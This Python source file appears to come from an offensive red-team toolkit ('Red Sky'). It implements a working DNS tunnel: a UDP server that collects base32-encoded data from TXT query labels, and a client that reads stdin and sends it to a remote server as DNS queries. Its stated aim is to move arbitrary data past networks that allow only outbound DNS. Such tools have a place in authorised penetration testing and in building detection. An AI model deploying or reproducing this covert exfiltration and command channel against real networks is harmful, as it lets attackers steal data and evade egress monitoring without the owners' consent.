# language: Python, file: Program/dns/tunnel.py, target: Red Sky dns — DNS tunneling
# DNS tunneling. Uses the same channel that lets users type "google.com"
# to move arbitrary data past a network that only allows UDP/53 outbound.
#
# Two sides:
#
#   server — binds UDP/53 (or any port) and answers TXT/A queries under a
#            given domain. Data is encoded in the query labels (client →
#            server) and in the TXT response (server → client).
#
#   client — takes local stdin, chunks it into labels of base32 (5 bits per
#            char, A-Z2-7 = DNS-safe), prepends a session id, fires the
#            query off to the server. Server replies with whatever it has
#            queued for that session.
#
# Base32 alphabet is 32 chars exactly. A DNS label is up to 63 chars, so
# each query carries 63 * 5 = 315 bits = 39 bytes. A full query name up
# to 255 bytes = ~150 bytes per query. Keep it at 63-char labels for
# maximum compatibility.

import base64
import json
import os
import socket
import struct
import sys
import threading
import time
import uuid
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


DNS_DIR = OUTPUT_DIR / "dns"
TUNNEL_DIR = DNS_DIR / "tunnel"


# ── wire format (minimal DNS) ───────────────────────────────────────────────
#
# DNS header (12 bytes):
#   id (2)   flags (2)   qdcount (2)   ancount (2)   nscount (2)   arcount (2)
# Question:   qname (labels, 0x00 terminator)  qtype (2)  qclass (2)
# Answer:     name (ptr or labels)  type (2)  class (2)  ttl (4)  rdlength (2)  rdata
#
# We only need A and TXT for the tunnel. Other types are ignored.

def _encode_qname(name: str) -> bytes:
    out = bytearray()
    for label in name.rstrip(".").split("."):
        b = label.encode()
        if len(b) > 63:
            raise ValueError("label too long: " + label[:40])
        out.append(len(b))
        out += b
    out.append(0)
    return bytes(out)


def _decode_qname(buf: bytes, off: int) -> Tuple[str, int]:
    labels = []
    while True:
        if off >= len(buf):
            raise ValueError("truncated qname")
        l = buf[off]
        if l == 0:
            off += 1
            break
        if (l & 0xC0) == 0xC0:
            # pointer — not supporting compression in this minimal parser
            ptr = struct.unpack("!H", buf[off:off+2])[0] & 0x3FFF
            sub, _ = _decode_qname(buf, ptr)
            labels.append(sub)
            off += 2
            break
        off += 1
        labels.append(buf[off:off+l].decode("latin-1", errors="replace"))
        off += l
    return ".".join(labels), off


def _build_query(qname: str, qtype: int, qid: int) -> bytes:
    hdr = struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0)  # standard query, RD=1
    q = _encode_qname(qname) + struct.pack("!HH", qtype, 1)
    return hdr + q


def _build_txt_response(qid: int, qname: str, text: str, ttl: int = 0) -> bytes:
    # header: response, AA, RD, RA
    hdr = struct.pack("!HHHHHH", qid, 0x8580, 1, 1, 0, 0)
    qsec = _encode_qname(qname) + struct.pack("!HH", 16, 1)
    # answer: name ptr to qname, type 16, class 1, ttl, rdlen, rdata
    rdata = bytes([len(text) & 0xFF]) + text.encode("latin-1", errors="replace")
    rdata = rdata[:255]
    ans = b"\xc0\x0c" + struct.pack("!HHIH", 16, 1, ttl, len(rdata)) + rdata
    return hdr + qsec + ans


def _build_a_response(qid: int, qname: str, ip: str, ttl: int = 0) -> bytes:
    hdr = struct.pack("!HHHHHH", qid, 0x8580, 1, 1, 0, 0)
    qsec = _encode_qname(qname) + struct.pack("!HH", 1, 1)
    octets = bytes(int(x) for x in ip.split("."))
    ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, ttl, 4) + octets
    return hdr + qsec + ans


# ── server ─────────────────────────────────────────────────────────────────

class TunnelServer:
    """UDP DNS server. Every query for <session>.<suffix> gets stored as
    data, and the response carries whatever the server has queued to send."""

    def __init__(self, bind: str, domain: str):
        self.bind = bind
        self.domain = domain.rstrip(".")
        self.sessions: Dict[str, List[bytes]] = {}  # session → received chunks
        self.replies: Dict[str, List[bytes]] = {}   # session → queued replies
        self.lock = threading.Lock()

    def parse(self, data: bytes, addr) -> Optional[bytes]:
        if len(data) < 12:
            return None
        qid, flags, qd, an, ns, ar = struct.unpack("!HHHHHH", data[:12])
        if qd < 1:
            return None
        try:
            qname, off = _decode_qname(data, 12)
        except Exception:
            return None
        qtype, qclass = struct.unpack("!HH", data[off:off+4])

        # qname is <chunk>.<session>.<domain>
        parts = qname.rstrip(".").split(".")
        # strip the domain suffix
        suffix = self.domain.split(".")
        if len(parts) < len(suffix) + 2:
            # short / not ours — reply with a plain A
            return _build_a_response(qid, qname, "127.0.0.1")

        # check domain match
        tail = parts[-len(suffix):]
        if tail != suffix:
            return _build_a_response(qid, qname, "127.0.0.1")

        # session = the label just before the suffix
        session = parts[-len(suffix) - 1]
        chunk_labels = parts[: -len(suffix) - 1]
        chunk = "".join(chunk_labels).upper()  # labels are case-insensitive
        try:
            pad = "=" * ((8 - len(chunk) % 8) % 8)
            decoded = base64.b32decode(chunk + pad)
        except Exception:
            decoded = b""

        with self.lock:
            if decoded:
                self.sessions.setdefault(session, []).append(decoded)
            q = b""
            if self.replies.get(session):
                q = self.replies[session].pop(0)
        return _build_txt_response(qid, qname, q.decode("latin-1", errors="replace"))

    def serve(self):
        host, port_s = self.bind.rsplit(":", 1)
        port = int(port_s)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        print_ok("tunnel server listening on " + self.bind)
        print_kv("domain", self.domain)
        print()
        try:
            while True:
                data, addr = sock.recvfrom(4096)
                resp = self.parse(data, addr)
                if resp:
                    sock.sendto(resp, addr)
        except KeyboardInterrupt:
            print()
            print_info("stopped")


# ── client ─────────────────────────────────────────────────────────────────

class TunnelClient:
    def __init__(self, server: str, port: int, domain: str, session: str = ""):
        self.server = server
        self.port = port
        self.domain = domain.rstrip(".")
        self.session = session or uuid.uuid4().hex[:8]

    def send_chunk(self, data: bytes, timeout: float = 3.0) -> bytes:
        """Base32 the payload, chunk into 60-char labels, fire each as a query.
        Collects the TXT replies (concatenated) as the server's downstream."""
        b32 = base64.b32encode(data).decode().rstrip("=")
        labels = [b32[i:i+60] for i in range(0, len(b32), 60)]
        replies = []
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        qid_base = int(time.time() * 1000) & 0xFFFF
        for i, label in enumerate(labels):
            qname = label + "." + self.session + "." + self.domain
            qid = (qid_base + i) & 0xFFFF
            pkt = _build_query(qname, 16, qid)
            try:
                sock.sendto(pkt, (self.server, self.port))
                resp, _ = sock.recvfrom(4096)
                # parse TXT rdata
                if len(resp) > 12:
                    # skip header, question
                    try:
                        _, off = _decode_qname(resp, 12)
                        off += 4
                        if off < len(resp):
                            # answer name (2) type(2) class(2) ttl(4) rdlen(2) = 12 bytes
                            off += 12
                            if off < len(resp):
                                rdlen = struct.unpack("!H", resp[off-2:off])[0]
                                rd = resp[off:off+rdlen]
                                if rd:
                                    replies.append(rd[1:rd[0]+1])
                    except Exception:
                        pass
            except socket.timeout:
                pass
        sock.close()
        return b"".join(replies)


def cmd_server(bind: str, domain: str) -> int:
    if not bind or not domain:
        print_err("--bind and --domain required")
        return 1
    DNS_DIR.mkdir(parents=True, exist_ok=True)
    srv = TunnelServer(bind, domain)
    srv.serve()
    # on exit, dump received chunks
    out = TUNNEL_DIR / ("recv_" + str(int(time.time())) + ".bin")
    TUNNEL_DIR.mkdir(parents=True, exist_ok=True)
    with out.open("wb") as f:
        for session, chunks in srv.sessions.items():
            for c in chunks:
                f.write(c)
    print_kv("received", out)
    return 0


def cmd_send(server: str, port: int, domain: str, message: str, session: str) -> int:
    if not server or not domain:
        print_err("--server and --domain required")
        return 1
    cli = TunnelClient(server, port, domain, session)
    payload = message.encode() if message else sys.stdin.buffer.read()
    print_info("tunnel send")
    print_kv("server", server + ":" + str(port))
    print_kv("domain", domain)
    print_kv("session", cli.session)
    print_kv("bytes", len(payload))
    print()
    reply = cli.send_chunk(payload)
    print_kv("reply_bytes", len(reply))
    if reply:
        print(BONE + reply.decode("latin-1", errors="replace") + RESET)
    return 0


def run_cli(args):
    import argparse
    sub = args[0] if args else "help"
    rest = args[1:] if args else []

    if sub in ("-h", "--help", "help"):
        print_info("redsky dns tunnel <sub-command>")
        print_info("")
        print_info("  server --bind 0.0.0.0:53 --domain t.example.com")
        print_info("      answer TXT queries under <domain>, log received chunks")
        print_info("  send   --server IP --port 53 --domain t.example.com --message 'hi'")
        print_info("      base32 chunk + query; prints the TXT reply (server → client)")
        return 0

    if sub == "server":
        p = argparse.ArgumentParser(prog="redsky dns tunnel server", add_help=False)
        p.add_argument("--bind", default="0.0.0.0:53")
        p.add_argument("--domain", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky dns tunnel server --bind 0.0.0.0:53 --domain t.example.com")
            return 2
        return cmd_server(ns.bind, ns.domain)

    if sub == "send":
        p = argparse.ArgumentParser(prog="redsky dns tunnel send", add_help=False)
        p.add_argument("--server", default="")
        p.add_argument("--port", type=int, default=53)
        p.add_argument("--domain", default="")
        p.add_argument("--message", default="")
        p.add_argument("--session", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky dns tunnel send --server IP --domain t.example.com --message 'hi'")
            return 2
        return cmd_send(ns.server, ns.port, ns.domain, ns.message, ns.session)

    print_err("unknown tunnel sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
